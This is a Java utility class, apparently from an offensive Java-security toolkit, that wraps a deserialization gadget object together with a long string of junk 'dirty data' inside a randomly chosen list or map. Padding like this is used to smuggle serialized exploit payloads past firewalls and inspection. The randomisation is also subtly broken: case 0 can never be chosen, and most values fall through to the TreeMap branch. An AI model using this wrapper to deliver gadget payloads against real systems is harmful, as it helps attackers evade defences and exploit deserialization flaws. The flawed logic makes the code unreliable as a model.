package com.xyuxu.javasec.utils;
import java.util.*;

public class DirtyDataWrapper {


    private int dirtyDataSize;
    private String dirtyData;
    private Object gadget;

    public DirtyDataWrapper(Object gadget, int dirtyDataSize){
        this.gadget = gadget;
        this.dirtyDataSize = dirtyDataSize;
    }

    /**
     * 将脏数据和gadget对象存到集合对象中
     * @return 一个包裹脏数据和gadget对象可序列化对象
     */
    public Object doWrap(){
        Object wrapper = null;
        dirtyData = getLongString(dirtyDataSize);
        int type = (int)(Math.random() * 10) % 10 + 1;
        switch (type){
            case 0:
                List<Object> arrayList = new ArrayList<Object>();
                arrayList.add(dirtyData);
                arrayList.add(gadget);
                wrapper = arrayList;
                break;
            case 1:
                List<Object> linkedList = new LinkedList<Object>();
                linkedList.add(dirtyData);
                linkedList.add(gadget);
                wrapper = linkedList;
                break;
            case 2:
                HashMap<String,Object> map = new HashMap<String, Object>();
                map.put("a",dirtyData);
                map.put("b",gadget);
                wrapper = map;
                break;
            case 3:
                LinkedHashMap<String,Object> linkedHashMap = new LinkedHashMap<String,Object>();
                linkedHashMap.put("a",dirtyData);
                linkedHashMap.put("b",gadget);
                wrapper = linkedHashMap;
                break;
            default:
            case 4:
                TreeMap<String,Object> treeMap = new TreeMap<String, Object>();
                treeMap.put("a",dirtyData);
                treeMap.put("b",gadget);
                wrapper = treeMap;
                break;
        }
        return wrapper;
    }


    public static String getLongString(int length){
        String str = "";
        for (int i=0;i<length;i++){
            str += "x";
        }
        return str;
    }
}